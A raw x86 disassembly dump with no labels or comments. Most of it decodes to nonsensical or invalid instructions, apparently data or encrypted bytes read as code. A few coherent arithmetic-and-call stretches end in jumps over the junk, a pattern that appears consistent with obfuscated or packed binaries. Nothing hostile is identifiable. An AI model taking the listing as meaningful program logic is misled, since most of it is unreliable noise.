  40fd24:	aam    0x56
  40fd26:	lea    esi,[edx+ebp*2]
  40fd29:	push   ebp
  40fd2a:	and    al,0xf2
  40fd2c:	inc    ecx
  40fd2d:	inc    esp
  40fd2e:	xchg   esp,eax
  40fd2f:	dec    esi
  40fd30:	rdmsr  
  40fd32:	retf   
  40fd33:	loope  0x40fcba
  40fd35:	or     al,0x56
  40fd37:	pop    edx
  40fd38:	mov    esp,DWORD PTR [edx-0x66f082db]
  40fd3e:	sahf   
  40fd3f:	inc    esi
  40fd40:	shl    BYTE PTR [edi-0x575c9e98],0xb1
  40fd47:	shl    DWORD PTR [esi-0x2daa8c80],cl
  40fd4d:	xchg   BYTE PTR [ecx-0x3c315c48],al
  40fd53:	mov    ebp,0x11f43c28
  40fd58:	ins    DWORD PTR es:[edi],dx
  40fd59:	jns    0x40fd28
  40fd5b:	mov    al,0x8
  40fd5d:	xchg   edi,eax
  40fd5e:	adc    BYTE PTR [edi-0x4415de1d],dh
  40fd64:	and    DWORD PTR [esi+0x76],0xe6375bb7
  40fd6b:	mov    ds:0x6786a4a9,al
  40fd70:	mov    ds:0x7dde2c7f,eax
  40fd75:	xchg   ebp,eax
  40fd76:	loop   0x40fd0e
  40fd78:	test   eax,0xbcfaa240
  40fd7d:	or     DWORD PTR [edi],0xbbf61f4b
  40fd83:	outs   dx,DWORD PTR ds:[esi]
  40fd84:	enter  0x1b3,0xb5
  40fd88:	loope  0x40fd75
  40fd8a:	cmp    ecx,DWORD PTR es:[edi]
  40fd8d:	retf   
  40fd8e:	shr    ah,0x2b
  40fd91:	push   ecx
  40fd92:	xor    esi,DWORD PTR [edi-0x55a5c789]
  40fd98:	mov    eax,ds:0xd233493e
  40fd9d:	or     eax,0x1c8e2297
  40fda2:	xor    DWORD PTR [ebx+0x58aa153],esi
  40fda8:	cmp    BYTE PTR [edi+0xa3dcc18],bh
  40fdae:	nop
  40fdaf:	shl    BYTE PTR [ecx],0xf4
  40fdb2:	jmp    0x40fde9
  40fdb4:	lods   al,BYTE PTR ds:[esi]
  40fdb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb6:	addr16 and al,0x1e
  40fdb9:	push   cs
  40fdba:	pop    ds
  40fdbb:	rol    DWORD PTR [ecx],0xbe
  40fdbe:	fs mov eax,0xd1d700ec
  40fdc4:	jno    0x40fddb
  40fdc6:	icebp  
  40fdc7:	hlt    
  40fdc8:	xor    BYTE PTR [eax+ecx*4-0x30],cl
  40fdcc:	mov    ds:0xbf52c38b,eax
  40fdd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd2:	mov    dh,BYTE PTR [edi+0x60]
  40fdd5:	jge    0x40fd78
  40fdd7:	sub    DWORD PTR ds:0x1e1375be,edi
  40fddd:	popf   
  40fdde:	enter  0x276c,0x9a
  40fde2:	jmp    0xb50aca5a
  40fde7:	dec    BYTE PTR [ebx]
  40fde9:	ror    DWORD PTR [ebx+0x4d8be04d],0xe4
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x422281
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0xcd
  40fe8f:	por    mm4,mm3
  40fe92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe93:	sub    al,0xbe
  40fe95:	mov    esi,0xbebec4e3
  40fe9a:	aad    0x2f
  40fe9c:	jno    0x40fe32
  40fe9e:	mov    dh,0xff
  40fea0:	cmp    DWORD PTR [ecx-0x1c902afc],edx
  40fea6:	lods   al,BYTE PTR ds:[esi]
  40fea7:	pop    esi
  40fea8:	jl     0x40feec
  40feaa:	mov    al,ds:0xf861b6a8
  40feaf:	push   ds
  40feb0:	mov    BYTE PTR [ebx+0x4cbc18d2],al
  40feb6:	inc    edx
  40feb7:	setne  cl
  40feba:	fist   WORD PTR [edi+0x71]
  40febd:	cli    
  40febe:	push   ss
  40febf:	sti    
  40fec0:	dec    ebp
  40fec1:	and    al,BYTE PTR [esi-0x732b30eb]
  40fec7:	lods   eax,DWORD PTR ds:[esi]
  40fec8:	sbb    BYTE PTR [esi+0x688d6178],dh
  40fece:	xchg   ebp,eax
  40fecf:	jne    0x40fe83
  40fed1:	inc    esp
  40fed2:	je     0x40feb2
  40fed4:	scas   al,BYTE PTR es:[edi]
  40fed5:	sbb    eax,0x81d38db4
  40feda:	call   0xc9c5ef22
  40fedf:	bound  ebx,QWORD PTR [eax]
  40fee1:	sti    
  40fee2:	(bad)  
  40fee3:	and    ch,BYTE PTR [eax]
  40fee5:	call   0x15c98d86
  40feea:	inc    eax
  40feeb:	xor    BYTE PTR [ecx+0xaebfcf1],bh
  40fef1:	inc    edx
  40fef2:	or     eax,0xbabb52d2
  40fef7:	mov    al,ds:0x29da9a83
  40fefc:	das    
  40fefd:	outs   dx,BYTE PTR ds:[esi]
  40fefe:	lods   eax,DWORD PTR ds:[esi]
  40feff:	arpl   WORD PTR [edi-0x2f703dae],di
  40ff05:	jo     0x40feea
  40ff07:	repnz (bad) 
  40ff09:	aam    0x7c
  40ff0b:	popf   
  40ff0c:	loope  0x40fedb
  40ff0e:	shl    BYTE PTR [ebx],1
  40ff10:	sub    DWORD PTR [ecx+0x760883b5],edi
  40ff16:	scas   al,BYTE PTR es:[edi]
  40ff17:	pop    edi
  40ff18:	cld    
  40ff19:	or     al,0x22
  40ff1b:	cmp    eax,ebp
  40ff1d:	ins    BYTE PTR es:[edi],dx
  40ff1e:	push   esi
  40ff1f:	or     BYTE PTR [edi],bh
  40ff21:	adc    esi,DWORD PTR [esi+0x18]
  40ff24:	add    esi,DWORD PTR [ebp-0x3b8b5bfa]
  40ff2a:	xor    BYTE PTR [ebp-0x16f5155b],dh
  40ff30:	and    edi,DWORD PTR [ebp+edi*8-0x6ec04afb]
  40ff37:	out    dx,al
  40ff38:	xchg   esp,eax
  40ff39:	mov    BYTE PTR [edi-0x5b4f5517],cl
  40ff3f:	mov    esp,DWORD PTR [ecx+ecx*2+0x2f0daa62]
  40ff46:	jmp    0x40ff73
  40ff48:	lods   al,BYTE PTR ds:[esi]
  40ff49:	fdivr  QWORD PTR [ebx]
  40ff4b:	daa    
  40ff4c:	push   ebx
  40ff4d:	jg     0x40ff0a
  40ff4f:	arpl   WORD PTR [ebp+eax*4-0x5],di
  40ff53:	cld    
  40ff54:	xor    al,0xbe
  40ff56:	sahf   
  40ff57:	adc    eax,0x4dd6ffe5
  40ff5c:	push   es
  40ff5d:	lods   eax,DWORD PTR ds:[esi]
  40ff5e:	or     eax,0x29cd90d6
  40ff63:	icebp  
  40ff64:	aaa    
  40ff65:	xor    cl,cl
  40ff67:	icebp  
  40ff68:	jg     0x40ff05
  40ff6a:	jmp    DWORD PTR [eax+ecx*2]
  40ff6d:	xchg   esi,eax
  40ff6e:	xor    eax,0xf3962de5
  40ff73:	mov    ebp,0x1d7afb47
  40ff78:	pop    edx
  40ff79:	add    al,BYTE PTR [esi+ebp*4+0x4079c28f]
  40ff80:	xchg   edx,eax
  40ff81:	rcl    DWORD PTR [esi],cl
  40ff83:	mov    DWORD PTR [ebx],esi
  40ff85:	inc    eax
  40ff86:	dec    esp
  40ff87:	mov    cl,0xc3
  40ff89:	xor    eax,0x8addc11b
  40ff8e:	xchg   edx,eax
  40ff8f:	das    
  40ff90:	call   0x8b046031
  40ff95:	(bad)  
  40ff96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff97:	enter  0x698a,0xc5
  40ff9b:	daa    
  40ff9c:	push   0x1f19c109
  40ffa1:	add    ch,ch
  40ffa3:	retf   0xb733
  40ffa6:	jle    0x40ffe5
  40ffa8:	ret    0x6e48
  40ffab:	stos   DWORD PTR es:[edi],eax
  40ffac:	out    dx,al
  40ffad:	out    dx,al
  40ffae:	push   edx
  40ffaf:	adc    al,0xde
  40ffb1:	sub    BYTE PTR [ebp+0x58672788],dl
  40ffb7:	inc    ebp
  40ffb8:	sbb    DWORD PTR [esi-0xc],esp
  40ffbb:	sub    BYTE PTR [eax-0x17],ah
  40ffbe:	jo     0x40ffdf
  40ffc0:	pop    edi
  40ffc1:	stos   DWORD PTR es:[edi],eax
  40ffc2:	repnz xor al,0xf6
  40ffc5:	sahf   
  40ffc6:	fbld   TBYTE PTR [eax+0x301d9011]
  40ffcc:	arpl   WORD PTR [edi+ebx*8+0x54ef70e9],bp
  40ffd3:	push   esp
  40ffd4:	sbb    eax,0x10b2376d
  40ffd9:	xchg   ebx,eax
  40ffda:	adc    eax,0xf2aa6982
  40ffdf:	or     BYTE PTR [eax+eiz*2],al
  40ffe2:	or     DWORD PTR [ecx-0x32390c51],eax
  40ffe8:	in     al,0x6e
  40ffea:	jo     0x410003
  40ffec:	jge    0x40fff0
  40ffee:	add    eax,0xc488408a
  40fff3:	push   0x3fb457e0
  40fff8:	jmp    0x40ffb8
  40fffa:	mov    ecx,0x8a9174a2
  40ffff:	aam    0x48
  410001:	xor    BYTE PTR [edi],cl
  410003:	sbb    al,0xb8
  410005:	stc    
  410006:	dec    eax
  410007:	das    
  410008:	jae    0x410053
  41000a:	jns    0x410071
  41000c:	outs   dx,DWORD PTR ds:[esi]
  41000d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000e:	cmp    ah,ah
  410010:	mov    ds,WORD PTR [ebx+edx*2+0x62]
  410014:	add    al,BYTE PTR [ecx+0xf013160]
  41001a:	mov    di,0xbdf6
  41001e:	pop    edi
  41001f:	jnp    0x410008
  410021:	mov    ah,0x78
  410023:	std    
  410024:	and    dl,BYTE PTR [ecx+0x57]
  410027:	gs jbe 0x40ffb7
  41002a:	inc    edx
  41002b:	add    ch,BYTE PTR [esi]
  41002d:	pusha  
  41002e:	fmul   DWORD PTR [esi+0x1fc18d90]
  410034:	ins    BYTE PTR es:[edi],dx
  410035:	pop    edx
  410036:	and    edx,ebp
  410038:	arpl   WORD PTR [eax-0x42],ax
  41003b:	ret    
  41003c:	fcmovbe st,st(1)
  41003e:	sub    DWORD PTR [ebp+0x586160e4],esp
  410044:	out    dx,al
  410045:	enter  0xa969,0xdd
  410049:	icebp  
  41004a:	cli    
  41004b:	jb     0x4100cb
  41004d:	in     eax,0x9
  41004f:	repz loopne 0x4100cb
  410052:	inc    edi
  410053:	xchg   esi,eax
  410054:	push   0xfffffffa
  410056:	dec    edx
  410057:	mov    ch,0x7c
  410059:	or     ecx,esi
  41005b:	sbb    bl,BYTE PTR [ebx+0x1004b80b]
  410061:	mov    esi,0x36c5061f
  410066:	ds shl bh,1
  410069:	pop    ebx
  41006a:	mov    cl,0x1e
  41006c:	into   
  41006d:	cmp    al,0xe
  41006f:	dec    eax
  410070:	xor    edi,DWORD PTR [ebx-0x2f]
  410073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410075:	mov    al,0x90
  410077:	in     al,0x26
  410079:	add    al,0x19
  41007b:	inc    ebp
  41007c:	add    eax,0xe9f3ec09
  410081:	(bad)  
  410082:	(bad)  
  410083:	pop    eax
  410084:	add    dl,BYTE PTR [eax]
  410086:	jno    0x410032
  410088:	jecxz  0x410055
  41008a:	(bad)  
  41008b:	cmc    
  41008c:	scas   al,BYTE PTR es:[edi]
  41008d:	push   ecx
  41008e:	mov    edx,0x205db7c5
  410093:	xor    DWORD PTR [ebp-0x432d2ee6],esp
  410099:	rol    BYTE PTR [edi-0x154aadb6],1
  41009f:	ds sbb eax,0xcf3cc6e7
  4100a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100a6:	push   cs
  4100a7:	repnz cld 
  4100a9:	pop    DWORD PTR [edi-0x30]
  4100ac:	and    ch,BYTE PTR [eax+ebp*1]
  4100af:	push   ebp
  4100b0:	nop    eax
  4100b3:	inc    esi
  4100b4:	dec    DWORD PTR fs:[ecx]
  4100b7:	clc    
  4100b8:	outs   dx,BYTE PTR ds:[esi]
  4100b9:	sub    DWORD PTR [eax+0x3a],ecx
  4100bc:	push   eax
  4100bd:	(bad)  
  4100be:	inc    edx
  4100bf:	mov    cl,0xd9
  4100c1:	xor    ebx,DWORD PTR gs:[ecx-0x6b]
  4100c5:	sbb    eax,0x7355297
  4100ca:	aam    0xb3
  4100cc:	les    esp,FWORD PTR [eax-0x29dd1b0d]
  4100d2:	cmp    cl,BYTE PTR [ebx]
  4100d4:	inc    edi
  4100d5:	adc    esi,DWORD PTR [eax]
  4100d7:	pop    ds
  4100d8:	push   0x2d
  4100da:	mov    eax,ds:0x6b84c3ce
  4100df:	xchg   esi,eax
  4100e0:	jns    0x4100a1
  4100e2:	outs   dx,DWORD PTR ds:[esi]
  4100e3:	add    BYTE PTR [ecx+eiz*1-0x47e2c474],dh
  4100ea:	lock sub eax,0x77d12281
  4100f0:	mov    edi,0x26bbbd12
  4100f5:	fld    DWORD PTR [ebp-0x16]
  4100f8:	(bad)  
  4100f9:	stc    
  4100fa:	(bad)  
  4100fb:	out    0xbd,eax
  4100fd:	mov    bh,0x77
  4100ff:	pop    edi
  410100:	ins    BYTE PTR es:[edi],dx
  410101:	xchg   esi,eax
  410102:	cld    
  410103:	pop    ebp
  410104:	dec    eax
  410105:	loopne 0x410114
  410107:	imul   si,cx,0x15
  41010b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41010c:	(bad)  
  41010d:	jno    0x4100b6
  41010f:	pop    es
  410110:	add    edx,edi
  410112:	ja     0x410178
  410114:	lods   eax,DWORD PTR ds:[esi]
  410115:	gs cdq 
  410117:	or     WORD PTR [ebp-0x52],bx
  41011b:	call   0x3bcdb663
  410120:	mov    ch,BYTE PTR [edi]
  410122:	dec    ebx
  410123:	xchg   ebp,eax
  410124:	sbb    BYTE PTR [esi-0x3a64b5b1],bh
  41012a:	daa    
  41012b:	icebp  
  41012c:	mov    ch,0x48
  41012e:	lds    esp,FWORD PTR [ecx-0x4]
  410131:	in     eax,0xd8
  410133:	sbb    al,al
  410135:	call   0x5385dc58
  41013a:	push   ebx
  41013b:	xchg   DWORD PTR [ebx],esi
  41013d:	sub    al,0xa8
  41013f:	adc    esi,DWORD PTR [esi]
  410141:	mov    ecx,0xea2acfd1
  410146:	push   0x58
  410148:	mov    bl,0x9c
  41014a:	pop    esp
  41014b:	stos   BYTE PTR es:[edi],al
  41014c:	mov    esp,0x16465d35
  410151:	data16 cli 
  410153:	popa   
  410154:	add    BYTE PTR [edx+0x286b4621],bh
  41015a:	and    ah,BYTE PTR [eax+0x2f78d090]
  410160:	fcomp  QWORD PTR [esi]
  410162:	arpl   WORD PTR [ecx],dx
  410164:	js     0x4101cc
  410166:	xchg   BYTE PTR [eax+0x4c],dl
  410169:	aaa    
  41016a:	and    eax,0x45c93188
  41016f:	ss adc eax,0xc90d1945
  410175:	jbe    0x41018f
  410177:	mov    al,0xf
  410179:	cwde   
  41017a:	repnz fild WORD PTR [edi+0x7c]
  41017e:	fldenv [esi+0x61]
  410181:	cmp    eax,0xf1edc4a2
  410186:	sar    ch,0x6a
  410189:	push   ds
  41018a:	jp     0x41013e
  41018c:	jae    0x410150
  41018e:	inc    ebp
  41018f:	and    DWORD PTR [ecx],esp
  410191:	(bad)  
  410192:	jae    0x410197
  410194:	fsub   DWORD PTR [ebp-0x1c9b77db]
  41019a:	ds jmp 0xbab4a267
  4101a0:	and    BYTE PTR [ebx-0x6a],0xc4
  4101a4:	add    BYTE PTR [ebx],ah
  4101a6:	pop    edx
  4101a7:	stos   BYTE PTR es:[edi],al
  4101a8:	out    dx,eax
  4101a9:	sub    al,0x4c
  4101ab:	mov    ebx,0xe7383240
  4101b0:	mov    bh,0x81
  4101b2:	out    0xfd,eax
  4101b4:	fisub  DWORD PTR ss:[edx-0x41fa7306]
  4101bb:	sahf   
  4101bc:	std    
  4101bd:	out    dx,al
  4101be:	ins    BYTE PTR es:[edi],dx
  4101bf:	xchg   ecx,eax
  4101c0:	xchg   esi,eax
  4101c1:	ja     0x4101af
  4101c3:	sub    ebp,DWORD PTR [edi]
  4101c5:	rcl    BYTE PTR [ebx-0x5f],cl
  4101c8:	es mov esi,?
  4101cb:	or     dh,BYTE PTR [ebx+0x5d]
  4101ce:	jp     0x4101f5
  4101d0:	and    BYTE PTR [ecx+0x3d],bh
  4101d3:	cmp    cl,BYTE PTR ds:0xa06b5f0d
  4101d9:	sbb    BYTE PTR [eax+0x6a1af808],bl
  4101df:	nop
  4101e0:	test   dl,bl
  4101e2:	sub    bl,BYTE PTR [esi-0x74]
  4101e5:	inc    ebx
  4101e6:	cli    
  4101e7:	sar    DWORD PTR [ecx-0x663a1312],1
  4101ed:	and    eax,0x7ce4f3f8
  4101f2:	icebp  
  4101f3:	mov    edi,0x7ae2f0db
  4101f8:	aaa    
  4101f9:	push   edi
  4101fa:	stos   DWORD PTR es:[edi],eax
  4101fb:	pusha  
  4101fc:	and    al,0xb8
  4101fe:	out    dx,eax
  4101ff:	addr16 enter 0xac6f,0xb6
  410204:	lds    esi,FWORD PTR [ebx-0x73]
  410207:	mov    ds:0xb12625d4,al
  41020c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41020d:	pop    ebp
  41020e:	adc    bh,al
  410210:	out    dx,eax
  410211:	int3   
  410212:	(bad)  
  410213:	call   0x8d15:0x6066f078
  41021a:	outs   dx,DWORD PTR ds:[esi]
  41021b:	pop    edx
  41021c:	mov    bl,0x38
  41021e:	into   
  41021f:	mov    bl,0x37
  410221:	or     ebx,edx
  410223:	push   esi
  410224:	jecxz  0x41021d
  410226:	outs   dx,DWORD PTR ds:[esi]
  410227:	sbb    ecx,DWORD PTR [ebx+0x3c45be31]
  41022d:	nop
  41022e:	inc    esi
  41022f:	sbb    eax,0xd8458b8d
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	ins    BYTE PTR es:[edi],dx
  410270:	in     al,dx
  410271:	ss xchg edx,eax
  410273:	leave  
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	mov    al,ds:0x37dcaa3e
  410280:	sub    edi,eax
  410282:	scas   eax,DWORD PTR es:[edi]
  410283:	out    0x32,al
  410285:	fnstcw WORD PTR [eax+0x25eaf53d]
  41028b:	aaa    
  41028c:	pop    edx
  41028d:	into   
  41028e:	fsubrp st(3),st
  410290:	cli    
  410291:	mov    WORD PTR [ebp-0x68],ss
  410294:	test   eax,0x7d1d1193
  410299:	cwde   
  41029a:	jle    0x410249
  41029c:	or     edi,DWORD PTR [ecx-0xa0e3ba7]
  4102a2:	sub    al,0x67
  4102a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a5:	or     al,0x82
  4102a7:	push   0xe53f5318
  4102ac:	lods   al,BYTE PTR ds:[esi]
  4102ad:	push   eax
  4102ae:	and    eax,0xbdb9620a
  4102b3:	enter  0xc896,0x9f
  4102b7:	cld    
  4102b8:	xor    al,0x52
  4102ba:	call   0xed0:0xb513ceab
  4102c1:	shr    dl,cl
  4102c3:	add    bh,BYTE PTR [edi-0x268bec7f]
  4102c9:	(bad)  
  4102cb:	shl    BYTE PTR [edx*4-0x3ad6c9f6],cl
  4102d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d3:	ja     0x4102f3
  4102d5:	fidiv  WORD PTR [edx-0x70a98f2c]
  4102db:	std    
  4102dc:	pop    esp
  4102dd:	iret   
  4102de:	sbb    esp,ebx
  4102e0:	or     BYTE PTR [esi+ecx*1],bh
  4102e3:	xchg   edi,eax
  4102e4:	xor    al,0xa5
  4102e6:	(bad)  
  4102e7:	push   0x24f79a52
  4102ec:	push   0x60
  4102ee:	mov    DWORD PTR [ebp+ecx*2-0x1c],eax
  4102f2:	mov    ebp,0xd487b8ce
  4102f7:	std    
  4102f8:	or     dh,0x50
  4102fb:	fsubr  st(0),st
  4102fd:	dec    ebp
  4102fe:	mov    ch,0xef
  410300:	rcl    BYTE PTR [ecx-0x36],0xd3
  410304:	and    edi,DWORD PTR ds:0x4a22c4ba
  41030a:	xchg   ecx,eax
  41030b:	push   0x684463e7
  410310:	mov    esi,0xf078c6fe
  410315:	ss jmp 0x4102d5
  410318:	hlt    
  410319:	sub    BYTE PTR [edi+0x2f177dd5],al
  41031f:	jnp    0x4102f0
  410321:	and    ch,BYTE PTR [edx-0x11]
  410324:	sbb    DWORD PTR [edx],ebx
  410326:	sbb    eax,0x370f43d3
  41032b:	and    BYTE PTR [edi],0x20
  41032e:	in     al,0x5f
  410330:	adc    ah,BYTE PTR [edi]
  410332:	(bad)  
  410333:	out    0x79,al
  410335:	xchg   esp,eax
  410336:	js     0x41031e
  410338:	dec    ecx
  410339:	loopne 0x4103a5
  41033b:	imul   esp,DWORD PTR [ecx+0x525aff65],0xffffffa5
  410342:	inc    edi
  410343:	mov    esi,0xbac9f1c2
  410348:	mov    esi,0x1f70dcf1
  41034d:	or     ecx,DWORD PTR [eax]
  41034f:	lea    ebx,[ebp-0x6c629d66]
  410355:	cmc    
  410356:	iret   
  410357:	add    al,0x94
  410359:	mov    BYTE PTR [ebp+0x70],0xb2
  41035d:	shl    ebp,0x9a
  410360:	scas   al,BYTE PTR es:[edi]
  410361:	adc    esi,DWORD PTR [esi]
  410363:	sbb    BYTE PTR ds:0x7ca99d1a,al
  410369:	rol    DWORD PTR [edi-0x1deda36a],0x2
  410370:	xor    al,0x91
  410372:	sub    BYTE PTR [edi],al
  410374:	inc    edx
  410375:	xchg   BYTE PTR [eax+ebp*1-0x312bb770],cl
  41037c:	sub    bl,BYTE PTR [edi+0x2]
  41037f:	repz jl 0x410379
  410382:	pop    ds
  410383:	jge    0x410372
  410385:	outs   dx,DWORD PTR ds:[esi]
  410386:	sti    
  410387:	in     eax,0x9b
  410389:	and    eax,0xad6a3c26
  41038e:	and    eax,0xd73cd80e
  410393:	add    BYTE PTR [ebx+esi*4+0x4ebd5990],dl
  41039a:	or     eax,0xcc4d0dd
  41039f:	jae    0x41039a
  4103a1:	jmp    0x52a1:0xab8a43a
  4103a8:	and    eax,0xc2917e56
  4103ad:	fstp   QWORD PTR [ebx]
  4103af:	jmp    0x4103b9
  4103b1:	test   BYTE PTR [esi-0x2d],0x78
  4103b5:	mov    ds,WORD PTR [eax]
  4103b7:	xchg   ebp,eax
  4103b8:	dec    ebp
  4103b9:	dec    edi
  4103ba:	or     BYTE PTR [edx+edx*2+0x31aecba2],0x5
  4103c2:	xchg   edx,eax
  4103c3:	jno    0x4103b7
  4103c5:	addr16 mov bh,0xc3
  4103c8:	cwde   
  4103c9:	ds inc edx
  4103cb:	arpl   sp,dx
  4103cd:	xchg   ebp,eax
  4103ce:	add    al,BYTE PTR [ebx]
  4103d0:	ret    
  4103d1:	jae    0x4103bb
  4103d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103d4:	jmp    0xdefe735f
  4103d9:	repnz arpl WORD PTR [ebp+0x38a8de33],ax
  4103e0:	mov    ?,ebp
  4103e2:	mov    ecx,0x1d4f922e
  4103e7:	gs pop ds
  4103e9:	(bad)  [ebp+0x62]
  4103ec:	cmc    
  4103ed:	pop    ss
  4103ee:	jp     0xd0549332
  4103f4:	in     al,dx
  4103f5:	jle    0x41043c
  4103f7:	pop    ds
  4103f8:	ret    0xc463
  4103fb:	ins    BYTE PTR es:[edi],dx
  4103fc:	jge    0x4103fa
  4103fe:	jg     0x4103f3
  410400:	icebp  
  410401:	std    
  410402:	push   ebx
  410403:	fwait
  410404:	add    dh,BYTE PTR [ebp+edi*1-0x11]
  410408:	out    0xdc,al
  41040a:	and    al,BYTE PTR ds:0x1f33db5b
  410410:	mov    al,ds:0x2cdad9b7
  410415:	in     al,dx
  410416:	dec    ebx
  410417:	cmp    dh,BYTE PTR [ebp-0x1221ba4b]
  41041d:	imul   ecx,DWORD PTR [edx+0x75],0x1b
  410421:	lahf   
  410422:	sbb    al,0xb5
  410424:	adc    al,0x82
  410426:	test   ah,bh
  410428:	neg    DWORD PTR [eax-0x22]
  41042b:	mov    eax,DWORD PTR [edx+eax*1-0x428c0e73]
  410432:	or     eax,0xd91480a0
  410437:	js     0x41043a
  410439:	inc    ebx
  41043a:	jno    0x4103d0
  41043c:	pop    edi
  41043d:	mov    cl,0x2f
  41043f:	xchg   ebx,eax
  410440:	test   esp,esi
  410442:	sub    cl,bl
  410444:	iret   
  410445:	push   eax
  410446:	(bad)  
  410447:	dec    edi
  410448:	jg     0x41047a
  41044a:	out    0x12,eax
  41044c:	fadd   DWORD PTR [esi-0x38]
  41044f:	pop    edi
  410450:	or     DWORD PTR [ecx+ebp*4-0x4b49c068],ecx
  410457:	push   ds
  410458:	xchg   DWORD PTR [ebx],esi
  41045a:	and    DWORD PTR [ebp+0x75],esp
  41045d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41045e:	pop    ds
  41045f:	call   0xf2d0902d
  410464:	add    BYTE PTR [ebx],bh
  410466:	iret   
  410467:	ins    DWORD PTR es:[edi],dx
  410468:	ret    
  410469:	or     ch,BYTE PTR [esi]
  41046b:	arpl   WORD PTR [esi+0x7258fda9],di
  410471:	mov    esi,0x41273e5c
  410476:	adc    eax,0x2e3d68eb
  41047b:	loop   0x4104ba
  41047d:	inc    ecx
  41047e:	fistp  DWORD PTR [eax-0x4b]
  410481:	call   0x631166f8
  410486:	jb     0x41043c
  410488:	test   bh,bh
  41048a:	cmpxchg BYTE PTR [edi+ebx*2-0x22],ah
  41048f:	mov    al,ds:0xd8a26a3e
  410494:	test   BYTE PTR [esi-0x2320dce3],ah
  41049a:	jmp    0x41043f
  41049c:	rcl    DWORD PTR [ebp-0x5e],cl
  41049f:	dec    edx
  4104a0:	fimul  DWORD PTR [esi+0x3ad71b7b]
  4104a6:	test   eax,0x6a87e108
  4104ab:	jne    0x4104df
  4104ad:	push   cs
  4104ae:	and    al,0x2f
  4104b0:	ret    
  4104b1:	xchg   BYTE PTR [ecx-0x33],bl
  4104b4:	adc    DWORD PTR [esi+0xc],esi
  4104b7:	(bad)  
  4104b8:	fld    QWORD PTR [ecx+0x5facb6c7]
  4104be:	in     al,dx
  4104bf:	xchg   esi,eax
  4104c0:	inc    esp
  4104c1:	scas   al,BYTE PTR es:[edi]
  4104c2:	addr16 xor ah,bl
  4104c5:	mov    bh,0x59
  4104c7:	aam    0x46
  4104c9:	pop    esi
  4104ca:	sti    
  4104cb:	and    al,0x20
  4104cd:	aaa    
  4104ce:	jo     0x41053e
  4104d0:	(bad)  
  4104d1:	loope  0x41049c
  4104d3:	and    edx,DWORD PTR [ecx-0x7bce1302]
  4104d9:	inc    edi
  4104da:	adc    al,0x17
  4104dc:	sbb    eax,0x47d43d04
  4104e1:	in     eax,dx
  4104e2:	lahf   
  4104e3:	(bad)  [esi]
  4104e5:	lds    ebx,FWORD PTR [ecx]
  4104e7:	pusha  
  4104e8:	and    al,0xff
  4104ea:	lea    edx,ss:[edx]
  4104ed:	das    
  4104ee:	sbb    BYTE PTR [esi],dl
  4104f0:	std    
